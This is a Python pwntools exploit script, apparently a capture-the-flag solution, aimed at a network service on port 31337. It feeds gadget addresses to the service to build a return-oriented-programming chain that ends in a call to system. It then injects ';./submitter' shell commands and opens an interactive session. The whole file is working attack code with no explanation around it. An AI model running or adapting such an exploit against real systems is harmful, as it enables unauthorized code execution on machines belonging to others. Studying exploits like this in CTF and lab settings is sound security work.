#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

addr = '43434343434342'
p.sendlineafter('Addr pls: ',addr)
p.sendlineafter('Addr pls: ',addr)
p.sendlineafter('Addr pls: ',addr)

# plan 2
p.sendlineafter('Addr pls: ','00400000000')
p.sendlineafter('Addr pls: ','435827') # pop rdi;pop rbp;ret
p.sendlineafter('Addr pls: ','499999') 
p.sendlineafter('Addr pls: ','499999')
p.sendlineafter('Addr pls: ','471420') # add rax,rdi; ret
p.sendlineafter('Addr pls: ','435827') # # pop rdi;pop rbp;ret
p.sendlineafter('Addr pls: ','6999')
p.sendlineafter('Addr pls: ','6999')
p.sendlineafter('Addr pls: ','471420') # add rax,rdi; ret
p.sendlineafter('Addr pls: ','435827') # # pop rdi;pop rbp;ret
p.sendlineafter('Addr pls: ','199')
p.sendlineafter('Addr pls: ','199')
p.sendlineafter('Addr pls: ','471420') # add rax,rdi; ret
p.sendlineafter('Addr pls: ','435827') # # pop rdi;pop rbp;ret
p.sendlineafter('Addr pls: ','17')
p.sendlineafter('Addr pls: ','17')
p.sendlineafter('Addr pls: ','471420') # add rax,rdi; ret
p.sendlineafter('Addr pls: ','435827') # # pop rdi;pop rbp;ret
p.sendlineafter('Addr pls: ','17')
p.sendlineafter('Addr pls: ','17')
p.sendlineafter('Addr pls: ','471420') # add rax,rdi; ret
p.sendlineafter('Addr pls: ','401914') # system

p.sendline(b';./submitter')
p.sendline(b';./submitter')
p.sendline(b';./submitter')
p.sendline(b';./submitter')
p.sendline(b';./submitter')
print(p.recv())

p.interactive()